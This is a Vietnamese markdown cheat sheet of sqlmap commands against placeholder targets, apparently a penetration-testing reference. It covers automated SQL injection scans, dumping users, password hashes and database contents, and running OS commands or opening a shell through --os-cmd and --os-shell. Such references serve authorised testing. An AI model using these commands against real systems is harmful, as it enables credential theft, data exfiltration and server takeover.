> [!NOTE]
> Những dữ liệu năm trong ngoặc ngọn ```<>``` là dữ liệu tuỳ chỉnh
# Khai thác nhanh (bỏ qua các tuỳ chọn)
- Lệnh quét nhanh sẽ bỏ qua các tuỳ chọn được đưa ra trong quá trình quét, nhưng vẫn có thể thu về các thông tin cơ bản về lỗ hổng
- Câu lệnh sử dựng khi chưua có thông tin về mục tiêu
  
		sqlmap -u "<http://example.com>" --forms --flush-session --answers="form=Y,fill blank fields=n,skip=Y,tests=N,follow=N,keep=N,quit=Y,resume=Y" --batch
- **Lưu ý**: Tuỳ chọn ```--flush-session``` để xoá phiên làm việc trước đó, nếu cần sử dụng dữ liệu từ phiên làm việc trước thì cần bỏ tuỳ chọn này
# Khai thác toàn bộ
- Quét và thực hiện khai thác lỗ hổng với các tuỳ chọn mặc định
  
		sqlmap -u "<http://example.com>" --forms --flush-session --batch --all
- **Lưu ý**: Tuỳ chọn ```--flush-session``` để xoá phiên làm việc trước đó, nếu cần sử dụng dữ liệu từ phiên làm việc trước thì cần bỏ tuỳ chọn này
# Các lệnh tuỳ chỉnh
- Lệnh cơ bản:

		sqlmap -u <URL> [OPTIONS]
- Ta sẽ kết hợp câu lệnh cơ bản với các tuỳ chọn để phù hợp với từng mục đích
## Tuỳ chỉnh Request
- Cung cấp file Request:
  
		sqlmap -r <req.txt> --batch 
- Chỉ định tham số cho GET Request:

		sqlmap -u "<http://example.com/?id=*>" -p <id> --batch
- Chỉ định tham số cho POST Request:
  
 		sqlmap -u "<http://example.com>" --data="<username=*&password=*>" --batch
- Chỉ định Headers:

		sqlmap -u "<http://example.com>" --headers="<x-forwarded-for:127.0.0.1*>" --batch --forms
		sqlmap -u "<http://example.com>" --headers="<referer:*>" --forms
- Chỉ định cookie:
  
		sqlmap  -u "<http://example.com>" --cookie "<mycookies=*>" --forms --batch
- Chỉ định HTTP method:

		sqlmap --method=PUT -u "<http://example.com>" --forms --batch
- Chỉ định User-agent:

   		sqlmap -u "<http://example.com>" --user-agent=<SQLMAP> --forms --batch
## Thu thập thông tin
### Thông tin nội bộ
- Thông tin về người dùng hiện tại:

  		sqlmap -u "<http://example.com>" --current-user --forms --batch
- Kiểm tra người dùng hiện tại có phải admin không

		sqlmap -u "<http://example.com>" --is-dba --forms --batch
- Thông tin hostname:

		sqlmap -u "<http://example.com>" --hostname --forms --batch
- Thông tin các user hệ thống

		sqlmap -u "<http://example.com>" --users --forms --batch
- Thông tin về password của các users
  
		sqlmap -u "<http://example.com>" --password --forms --batch
- Thông tin về đặc quyền của các users

		sqlmap -u "<http://example.com>" --privileges --forms --batch
### Dữ liệu từ Database
- Các options chỉ định, có thể thêm vào các lệnh bên dưới để chỉ định DB, bảng, cột để lấy dữ liệu:
  - ```-D <DB NAME>```: Chỉ định Database
  - ```-T <TABLE NAME>```: Chỉ định bảng
  - ```-C <COLUMN NAME>```: Chỉ định cột
- Toàn bộ dữ liệu
  
  		sqlmap -u "<http://example.com>" --all --forms --batch
- Dữ liệu từ đối tượng được chỉ đinh

		sqlmap -u "<http://example.com>" -D <DB_NAME> -T <TABLE> -C <COLUMN> --forms --batch --dump
- Liệt kê các bảng

		sqlmap -u "<http://example.com>" --tables --forms --batch
- Liệt kê các cột

		sqlmap -u "<http://example.com>" --columns --forms --batch
## Shell
- Thực thi lệnh được chỉ định

  		sqlmap -u "<http://example.com>" --forms --batch --os-cmd <whoami>
- Mở Shell
  
		sqlmap -u "<http://example.com>" --forms --batch --os-shell
